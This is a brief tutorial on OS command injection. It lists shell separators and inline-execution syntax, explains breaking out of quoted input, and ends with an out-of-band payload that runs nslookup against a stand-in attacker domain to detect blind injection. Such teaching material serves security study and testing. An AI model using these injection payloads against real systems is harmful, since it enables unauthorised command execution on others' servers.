## Command Injection 

<h3> Ways of injecting OS commands </h3>

A variety of shell metacharacters can be used to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

    &
    &&
    |
    ||

The following command separators work only on Unix-based systems:

    ;
    Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

    `
    injected command `
    $(
    injected command )

Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 

<h3> Exploiting blind OS command injection using out-of-band (OAST) techniques </h3>

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
& nslookup kgji2ohoyw.web-attacker.com &

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected. 
